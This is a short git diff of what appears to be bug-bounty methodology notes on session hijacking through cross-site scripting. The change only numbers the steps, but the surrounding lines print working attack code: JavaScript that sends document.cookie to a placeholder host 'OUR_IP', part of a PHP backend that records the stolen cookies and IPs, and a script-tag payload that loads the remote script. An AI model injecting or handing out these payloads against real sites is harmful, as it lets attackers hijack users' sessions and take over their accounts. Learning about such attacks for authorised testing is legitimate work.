@@ -119,13 +119,13 @@ PHP 7.4.15 Development Server (http://0.0.0.0:80) started
 ## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Session Hijiacking
 Session Hijiacking is just an xss attack that target the cookies to steal the session.
 
-Typical payload for stealing cookies saved in a file ```script.js```
+1 - Typical payload for stealing cookies saved in a file ```script.js```
 ```js
 document.location='http://OUR_IP/index.php?c='+document.cookie;
 OR 
 new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 ```
-A small backend server to receive cookies and IP saved in a file ```index.php```
+2 - A small backend server to receive cookies and IP saved in a file ```index.php```
 ```php
 <?php
 if (isset($_GET['c'])) {
@@ -139,7 +139,7 @@ if (isset($_GET['c'])) {
 }
 ?>
 ```
-Payload
+3 - Payload
 ```js
 <script src=http://OUR_IP/script.js></script>
 ```
